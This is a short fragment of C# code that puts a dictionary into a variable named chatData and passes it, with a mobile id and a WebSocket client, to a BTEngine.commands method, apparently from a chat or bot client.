		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}
}
